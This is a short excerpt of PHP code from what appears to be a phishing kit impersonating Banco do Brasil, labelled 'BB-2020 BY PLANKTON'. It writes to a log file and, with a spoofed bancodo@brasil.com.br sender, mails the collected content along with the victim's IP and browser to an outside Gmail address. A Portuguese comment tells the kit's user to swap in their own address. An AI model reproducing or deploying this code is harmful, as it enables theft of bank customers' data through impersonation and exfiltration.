...
$fh = fopen($myFile, 'a') or die("Erro, Tente novamente!");
   ...
   $headers  .='From: ♠ BB-2020 BY PLANKTON <bancodo@brasil.com.br>';	
   $conteudo  = "♠  <font color='red'><b>BB-2020</b></font>  ♠<br><br>";
...
@mail('planktonlabss@gmail.com',"BB-2020 - $ip - $browser" ,"$conteudo" ,$headers); // TROCAR EMAIL AQUI 
